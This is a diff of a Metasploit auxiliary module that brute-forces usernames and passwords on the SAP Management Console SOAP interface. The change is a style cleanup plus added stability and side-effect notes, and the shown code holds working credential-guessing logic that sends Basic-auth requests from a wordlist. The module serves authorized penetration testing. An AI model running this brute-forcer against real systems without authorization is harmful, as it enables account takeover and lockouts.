@@ -11,20 +11,23 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'SAP Management Console Brute Force',
-      'Description'    => %q{
+      'Name' => 'SAP Management Console Brute Force',
+      'Description' => %q{
         This module simply attempts to brute force the username and
         password for the SAP Management Console SOAP Interface. If
         the SAP_SID value is set it will replace instances of <SAPSID>
         in any user/pass from any wordlist.
         },
-      'References'     =>
-        [
-          # General
-          [ 'URL', 'https://blog.c22.cc' ]
-        ],
-      'Author'         => [ 'Chris John Riley' ],
-      'License'        => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'https://blog.c22.cc' ]
+      ],
+      'Author' => [ 'Chris John Riley' ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -32,22 +35,25 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(50013),
         OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', nil]),
         OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),
-        OptPath.new('USER_FILE', [ false, "File containing users, one per line",
-                                   File.join(Msf::Config.data_directory, "wordlists", "sap_common.txt") ])
-      ])
+        OptPath.new('USER_FILE', [
+          false, 'File containing users, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'sap_common.txt')
+        ])
+      ]
+    )
     register_autofilter_ports([ 50013 ])
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
 
-  def run_host(rhost)
+  def run_host(_rhost)
     uri = normalize_uri(target_uri.path)
     res = send_request_cgi({
-      'uri'     => uri,
-      'method'  => 'GET'
+      'uri' => uri,
+      'method' => 'GET'
     })
 
-    if not res
+    if !res
       print_error("#{peer} [SAP] Unable to connect")
       return
     end
@@ -55,9 +61,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("SAPSID set to '#{datastore['SAP_SID']}'") if datastore['SAP_SID']
 
     each_user_pass do |user, pass|
-      enum_user(user,pass,uri)
+      enum_user(user, pass, uri)
     end
-
   end
 
   def report_cred(opts)
@@ -87,11 +92,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def enum_user(user, pass, uri)
-
     # Replace placeholder with SAP SID, if present
     if datastore['SAP_SID']
-      user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
-      pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
+      user = user.gsub('<SAPSID>', datastore['SAP_SID'].downcase)
+      pass = pass.gsub('<SAPSID>', datastore['SAP_SID'])
     end
 
     print_status("Trying username:'#{user}' password:'#{pass}'")
@@ -115,25 +119,25 @@ class MetasploitModule < Msf::Auxiliary
     data << '</SOAP-ENV:Body>' + "\r\n"
     data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
 
-    user_pass = Rex::Text.encode_base64(user + ":" + pass)
+    user_pass = Rex::Text.encode_base64(user + ':' + pass)
 
     begin
       res = send_request_raw({
-        'uri'      => uri,
-        'method'   => 'POST',
-        'data'     => data,
-        'headers'  =>
+        'uri' => uri,
+        'method' => 'POST',
+        'data' => data,
+        'headers' =>
           {
             'Content-Length' => data.length,
-            'SOAPAction'     => '""',
-            'Content-Type'   => 'text/xml; charset=UTF-8',
-            'Authorization'  => 'Basic ' + user_pass
+            'SOAPAction' => '""',
+            'Content-Type' => 'text/xml; charset=UTF-8',
+            'Authorization' => 'Basic ' + user_pass
           }
       })
 
       return unless res
 
-      if (res.code != 500 and res.code != 200)
+      if (res.code != 500) && (res.code != 200)
         return
       else
         body = res.body
@@ -150,7 +154,6 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{peer} [SAP] Unable to connect")
       return
@@ -178,4 +181,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
